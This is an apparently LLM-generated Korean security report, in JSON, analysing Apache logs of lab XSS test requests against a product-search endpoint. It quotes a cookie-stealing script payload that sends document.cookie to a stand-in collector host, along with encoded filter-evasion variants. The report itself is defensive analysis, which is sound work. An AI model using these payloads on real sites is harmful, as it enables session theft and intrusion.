@@ -1,0 +1,159 @@
+{
+  "meta": {
+    "generated_at": "2026-04-25T22:19:47.496+09:00",
+    "mode": "routine",
+    "provider": "anthropic",
+    "selected_model": "claude-haiku-4-5-20251001",
+    "store": false,
+    "reasoning_effort": "none",
+    "known_asset_ips": [
+      "192.168.56.105",
+      "192.168.56.108",
+      "192.168.56.109",
+      "192.168.56.110"
+    ],
+    "base_url": "https://api.anthropic.com/v1",
+    "response_id": "msg_01VpAFKBFRQ7JjSjM164bEoU",
+    "stop_reason": "end_turn",
+    "json_parse_strategy": "direct",
+    "input_stage1_results": "/opt/web_log_analysis/data/processed/cl-security_2026-04-25_21-30-00_to_2026-04-25_21-33-00_kst_stage1_results.json",
+    "input_llm_input": "/opt/web_log_analysis/data/processed/cl-security_2026-04-25_21-30-00_to_2026-04-25_21-33-00_kst_llm_input.json"
+  },
+  "report": {
+    "report_title": "2026-04-25 21:30~21:33 Apache 웹 로그 보안 분석 보고서 (Stage 2)",
+    "overall_assessment": "분석 기간(21:30~21:33) 동안 내부 자산 IP(192.168.56.110)에서 /rest/products/search 엔드포인트에 대해 다양한 형태의 XSS 페이로드를 포함한 9건의 요청이 탐지되었습니다. 모든 요청이 동일 출발지 IP이고 사용자 에이전트가 의도적 테스트 도구를 명시하고 있어, 내부 보안 테스트 또는 개발 환경의 자동화된 취약점 테스트로 평가됩니다. 실제 외부 공격 위협은 현재 낮으나, 애플리케이션이 XSS 페이로드를 처리하는 방식에 대한 개발팀 검토가 권장됩니다.",
+    "executive_summary": [
+      "분석 기간 3분 내 내부 자산 IP 1개(192.168.56.110)에서 XSS 의심 요청 8건, 오탐 1건 총 9건 탐지",
+      "모든 요청이 동일 엔드포인트(/rest/products/search)를 대상으로 하며, 사용자 에이전트에 'lab-c-set-xss-*' 테스트 라벨이 명시되어 있음",
+      "다양한 인코딩 및 우회 기법 시도(URL 인코딩, HTML 엔티티, 이중 인코딩, 혼합 대소문자)가 포함되었으나, 현재 Apache 로그만으로는 브라우저 XSS 실행 성공을 확정할 수 없음",
+      "요청 출발지가 known_asset_ips 내 IP이므로 내부 테스트 또는 자체 점검 가능성을 우선 검토 필요",
+      "document.cookie 접근 의도(rank 1) 및 외부 URL 리다이렉트 시도가 포함된 고급 페이로드 탐지됨",
+      "1건의 자연어 형태 검색 질의(rank 9)는 교육/문서 검색으로 평가되어 오탐으로 분류됨"
+    ],
+    "key_findings": [
+      {
+        "title": "내부 자산 IP에서의 집중된 XSS 페이로드 전송",
+        "detail": "192.168.56.110(known_asset_ips 포함)에서 21:30:39부터 21:32:19 사이 총 9건의 요청이 모두 /rest/products/search를 대상으로 송신되었습니다. 사용자 에이전트가 'lab-c-set-xss-core-*', 'lab-c-set-xss-adv-*' 등 의도적 테스트 도구를 명시하고 있어, 자동화된 내부 보안 테스트 또는 개발 환경의 점검 트래픽으로 평가됩니다. 공격자의 외부 침입 가능성은 현재 낮으나, 출발지 내부 테스트 목적 확인 필요.",
+        "severity": "medium"
+      },
+      {
+        "title": "다층 인코딩 기법을 활용한 XSS 우회 시도",
+        "detail": "URL 인코딩(%3Cscript%3E), HTML 엔티티(&lt;, &#x3C;), 이중 인코딩(%253C), 혼합 대소문자(<sCrIpT>) 등 다양한 우회 기법이 탐지되었습니다. reason_hints에서 encoding:url_encoded_payload, encoding:html_entity_payload, encoding:double_decoded_payload 등이 반복 확인되어, 애플리케이션의 입력 검증 및 인코딩 처리 방식을 점검할 필요가 있습니다. 다만 Apache 로그만으로 실제 우회 성공 여부는 확정할 수 없으며, 애플리케이션 응답 분석 필요.",
+        "severity": "medium"
+      },
+      {
+        "title": "브라우저 데이터 접근 의도 및 외부 전송 시도 포함",
+        "detail": "rank 1 incident(aey0EXHCi27Md-UoFOnpMwAAAEg)에서 document.location을 이용한 외부 URL(example.invalid/collect)로의 리다이렉트와 document.cookie 접근 의도가 명시되어 있습니다. XSS 페이로드가 '<script>document.location=\\'http://example.invalid/collect?c=\\'+document.cookie</script>' 형태로 감지되었으나, Apache 로그만으로는 실제 브라우저 실행 성공, 쿠키 탈취 성공 여부를 확정할 수 없습니다. 네트워크 또는 애플리케이션 모니터링이 필요.",
+        "severity": "high"
+      },
+      {
+        "title": "HTTP 오류 응답(500)과 정상 응답(200)의 혼합",
+        "detail": "XSS 페이로드에 대해 일부는 HTTP 500 text/html(rank 1, 4, 5) 응답, 일부는 HTTP 200 application/json(rank 2, 3, 6, 7, 8) 응답을 받았습니다. 500 오류는 애플리케이션 처리 실패로 볼 수 있으나, 200 응답의 경우 검색 엔드포인트가 입력을 JSON으로 처리/반향했을 가능성이 있습니다. 실제 브라우저에서의 XSS 실행 성공 여부는 응답 본문 분석이 필요하며, 현재 30바이트의 작은 응답 크기로는 반향 여부 확정이 어렵습니다.",
+        "severity": "medium"
+      },
+      {
+        "title": "교육/문서 검색으로 판단되는 자연어 질의 1건",
+        "detail": "rank 9 incident(aey0U_U0ZgNjgUQucSRN3QAAAA4)는 'how to prevent <script> alert in javascript'라는 자연어 검색 질의로 classify되었으며, reason_hints에서 'context:educational_xss_search', 'no_event_handler_assignment', 'no_javascript_protocol' 등이 확인되어 실제 공격이 아닌 보안 관련 키워드 검색으로 평가됩니다. 이는 오탐(likely_false_positive)으로 분류되어 무시 대상입니다.",
+        "severity": "low"
+      }
+    ],
+    "notable_incidents": [
+      {
+        "incident_ref": "request_id:aey0EXHCi27Md-UoFOnpMwAAAEg|table:security|log_id:9566|candidate:0",
+        "request_id": "aey0EXHCi27Md-UoFOnpMwAAAEg",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "high",
+        "why_it_matters": "document.cookie 접근과 외부 URL(example.invalid/collect)로의 리다이렉트를 시도하는 고급 XSS 페이로드가 명시적으로 확인되었습니다. 사용자 에이전트 'lab-c-set-xss-core-cookie-exfil-intent-1'이 의도적 테스트를 표시하고 있으나, 실제 쿠키 탈취 또는 외부 전송 성공 여부는 별도 네트워크/애플리케이션 증거 없이 Apache 로그만으로는 확정할 수 없습니다. 내부 자산 IP에서의 테스트로 평가되지만, 페이로드 의도가 명확하므로 검토 필요."
+      },
+      {
+        "incident_ref": "request_id:aeyz__U0ZgNjgUQucSRN3AAAAAw|table:security|log_id:9564|candidate:5",
+        "request_id": "aeyz__U0ZgNjgUQucSRN3AAAAAw",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "high",
+        "why_it_matters": "onerror 이벤트 핸들러와 alert(1) 함수 호출을 포함한 명확한 XSS 페이로드가 HTTP 200 응답으로 처리되었습니다. 사용자 에이전트 'lab-c-set-xss-core-event-onerror-1'이 의도적 테스트를 명시하고 있으며, application/json 응답 타입은 REST 엔드포인트가 입력을 처리했음을 시사합니다. 다만 200 status와 application/json만으로는 브라우저 XSS 실행 성공을 단정할 수 없으며, 응답 본문 검토 필요."
+      },
+      {
+        "incident_ref": "request_id:aeyz-HHCi27Md-UoFOnpMQAAAEQ|table:security|log_id:9563|candidate:1",
+        "request_id": "aeyz-HHCi27Md-UoFOnpMQAAAEQ",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "URL 인코딩된 형태의 <script>alert(document.cookie)</script> 페이로드가 브라우저 데이터 접근 의도와 함께 확인되었습니다. 200 상태 코드와 application/json 응답으로 처리되었으나, 실제 페이로드 반향 및 브라우저 실행 성공은 응답 본문 분석이 필요합니다. 내부 테스트 성격이지만 입력 인코딩 처리 점검 필요."
+      },
+      {
+        "incident_ref": "request_id:aey0THHCi27Md-UoFOnpNgAAAEw|table:security|log_id:9569|candidate:4",
+        "request_id": "aey0THHCi27Md-UoFOnpNgAAAEw",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "HTML 엔티티 인코딩을 이용한 XSS 우회 시도(&lt;script&gt; 형태)가 탐지되었습니다. reason_hints에서 encoding:html_entity_payload와 encoding:html_entity_decoded_xss가 확인되어 HTML 엔티티 복원 가능한 페이로드로 평가됩니다. 200 상태 응답이지만, HTML 엔티티 인코딩이 실제로 복원되어 실행되었는지는 응답 본문 분석 필요."
+      },
+      {
+        "incident_ref": "request_id:aey0CHHCi27Md-UoFOnpMgAAAEY|table:security|log_id:9565|candidate:8",
+        "request_id": "aey0CHHCi27Md-UoFOnpMgAAAEY",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "URL 이중 인코딩된 XSS 페이로드(%253Cscript%253E... = <script>alert(1)</script>)가 확인되었으며, 사용자 에이전트 'lab-c-set-xss-core-double-enc-script-1'이 의도적 테스트 도구를 명시합니다. 이중 인코딩은 WAF/필터 우회 목적으로 볼 수 있으나, 실제 우회 성공은 애플리케이션 디코딩 동작에 따라 달라집니다."
+      },
+      {
+        "incident_ref": "request_id:aey0U_U0ZgNjgUQucSRN3QAAAA4|table:security|log_id:9570|candidate:7",
+        "request_id": "aey0U_U0ZgNjgUQucSRN3QAAAA4",
+        "src_ip": "192.168.56.110",
+        "verdict": "likely_false_positive",
+        "severity": "low",
+        "why_it_matters": "'how to prevent <script> alert in javascript'라는 자연어 검색 질의로 평가됩니다. XSS 키워드가 포함되어 있지만 공격 구조(이벤트 핸들러, 자바스크립트 프로토콜, 브라우저 데이터 접근)가 없고, reason_hints에서 'context:educational_xss_search', 'no_event_handler_assignment' 등이 확인되어 교육/문서 검색으로 판단됩니다. 무시 대상."
+      }
+    ],
+    "notable_source_ips": [
+      {
+        "src_ip": "192.168.56.110",
+        "reason": "9건 모두의 의심 요청 출발지이며, known_asset_ips(192.168.56.105, 192.168.56.108, 192.168.56.109, 192.168.56.110)에 포함됨. 모든 요청의 사용자 에이전트가 'lab-c-set-*' 테스트 도구를 명시하고 있어 내부 보안 테스트, 자동화 점검, 또는 개발 환경의 자체 호출일 가능성이 높음. 외부 공격자 단정을 피하고 내부 테스트 목적 확인 필수."
+      }
+    ],
+    "noise_interpretation": "분석 기간 동안 필터링된 요청은 low_signal_fuzzing 1건(전체 filtered_out_rows의 100%)입니다. 이는 기본적으로 incident로 승격하지 않는 후보 밖 탐색성 요청으로 분류되며, 이 분석에서는 제외되었습니다. 후보 행 9건은 모두 security 테이블에서 생성되었으며, noise_group이 없어 유사 패턴 중복이 없습니다. 분석 대상 9건은 모두 동일 출발지 IP, 동일 엔드포인트, 동일 시간대에 집중되어 있어 단편적인 공격보다는 조직화된 내부 테스트의 특성을 보입니다.",
+    "recommended_actions": [
+      {
+        "priority": "P1",
+        "action": "내부 보안 테스트 목적 및 타이밍 확인",
+        "why": "192.168.56.110이 known_asset 내부 IP이고 모든 사용자 에이전트가 명시적 테스트 라벨('lab-c-set-xss-*')을 포함하고 있습니다. 개발팀, 보안팀, QA팀에 확인하여 21:30~21:33 구간 예정된 테스트 활동이 있었는지, 도구가 무엇인지 파악해야 합니다."
+      },
+      {
+        "priority": "P1",
+        "action": "/rest/products/search 엔드포인트의 입력 처리 및 응답 로직 검토",
+        "why": "8건의 XSS 페이로드가 모두 동일 엔드포인트를 대상으로 하고 있으며, 일부는 200 application/json 응답으로 처리되었습니다. 응답 본문(30바이트)이 작아 현재로는 페이로드 반향 여부 확정이 어렵지만, 실제 응답 내용을 분석하여 입력값이 JSON에 포함되는지, HTML 컨텍스트로 렌더링되는지 점검 필요."
+      },
+      {
+        "priority": "P2",
+        "action": "XSS 페이로드 처리에 대한 WAF 또는 애플리케이션 필터 동작 확인",
+        "why": "다양한 인코딩 기법(URL, HTML 엔티티, 이중 인코딩, 혼합 대소문자)이 시도되었으나 일부는 200으로 처리되었습니다. 현재 적용된 XSS 방어 메커니즘(Content-Security-Policy, output encoding, input validation)이 이러한 페이로드를 충분히 차단/인코딩하는지 검토 필요."
+      },
+      {
+        "priority": "P2",
+        "action": "HTTP 500 오류 발생의 원인 분석",
+        "why": "rank 1, 4, 5 incident에서 XSS 페이로드에 대해 500 text/html 응답이 반환되었습니다. 이는 애플리케이션 처리 실패를 의미하지만, 페이로드가 서버에 전달되고 처리 시도된 것을 확인해줍니다. 에러 로그와 애플리케이션 로그를 검토하여 500 원인이 무엇인지, 보안 관련인지 파악 필요."
+      },
+      {
+        "priority": "P2",
+        "action": "네트워크 및 엔드포인트 모니터링을 통한 브라우저 XSS 실행 확인",
+        "why": "Apache 로그만으로는 페이로드가 브라우저에서 실행되었는지 확정할 수 없습니다. 내부 테스트가 맞다면, 테스트 대상 클라이언트의 브라우저 개발자 도구 로그, 네트워크 추적(wireshark), 또는 example.invalid 수집 서버의 로그를 확인하여 실제 XSS 실행 여부 검증 필요."
+      },
+      {
+        "priority": "P3",
+        "action": "false_positive_review_candidates 검토: 교육용 SQL/XSS 검색 질의 모니터링",
+        "why": "false_positive_review_candidates에 'educational_xss_keyword_search' 형태의 요청이 기록되어 있습니다. 현재는 rank 9로 평가된 자연어 검색이 이미 오탐 처리되었지만, 향후 유사한 보안 교육/문서 검색 질의를 필터링할 규칙 정제 필요."
+      }
+    ],
+    "confidence_and_limitations": [
+      "모든 출발지 IP(192.168.56.110)가 known_asset_ips에 포함되고 사용자 에이전트가 명시적 테스트 라벨을 포함하고 있어, 내부 자동화 테스트 또는 개발 환경 활동으로 평가하는 신뢰도는 높습니다. 다만 내부 IP 스푸핑 또는 악의적 내부자 가능성을 완전히 배제하지는 못합니다.",
+      "Apache 웹 로그만으로는 XSS 페이로드의 브라우저 실행 성공을 확정할 수 없습니다. 200 status_code와 application/json resp_content_type은 서버가 요청을 처리했음을 의미하지만, 응답 본문이 30바이트로 작아 실제 페이로드 반향 여부를 Apache 로그에서 판단할 수 없습니다.",
+      "500 text/html 응답은 서버 처리 오류 정황을 나타내지만, 이를 XSS 실행 성공의 근거로 해석하지 않았습니다. 오류 메시지 자체가 XSS 취약할 수 있지만, 현재 응답 본문 분석 없이는 확정 불가능.",
+      "document.cookie, document.location 등 브라우저 데이터 접근 시도가 명시적으로 탐지되었으나, 실제 쿠키 탈취, 외부 URL 리다이렉트 성공 여부는 별도 네트워크 모니터링(DNS, HTTP 아웃바운드) 또는 애플리케이션 로그 없이 확정할 수 없습니다.",
+      "HTML 엔티티, URL 인코딩, 이중 인코딩 등 우회 기법이 탐지되었으나, 실제 우회 성공은 애플리케이션의 디코딩 순서와 검증 시점에 따라 달라집니다. Apache 로그만으로는 애플리케이션이 이를 복원하여 처리했는지 판단할 수 없습니다.",
+      "1건의 필터링된 요청(low_signal_fuzzing)이 존재하나, 현재 분석 범위에서 제외되었으므로 세부 내용 확인 불가. 이는 후보 밖 탐색성 요청으로 간주됨."
+    ],
+    "presentation_takeaway": "분석 기간의 9건 요청은 모두 내부 자산 IP(192.168.56.110)에서 /rest/products/search 엔드포인트를 대상으로 한 의도적 XSS 테스트로 평가됩니다. 사용자 에이전트의 명시적 테스트 라벨('lab-c-set-xss-core-*', 'lab-c-set-xss-adv-*')과 집중된 시간대(21:30~21:33)를 고려하면 자동화된 내부 보안 검사 또는 개발 환경 점검일 가능성이 높습니다. 현재 외부 공격 위협은 낮으나, (1) 내부 테스트 목적 및 일정 확인, (2) 애플리케이션이 다양한 인코딩 기법의 XSS 페이로드를 어떻게 처리하는지 검증, (3) 실제 브라우저 XSS 실행 여부 확인 등이 필요합니다. 특히 rank 1 요청의 document.cookie 탈취 의도와 외부 URL 리다이렉트 시도는 고급 공격 시나리오이므로, 내부 테스트 목적이 확인되더라도 애플리케이션 방어 기능의 효과성을 검증하는 데 활용할 가치가 있습니다."
+  }
+}
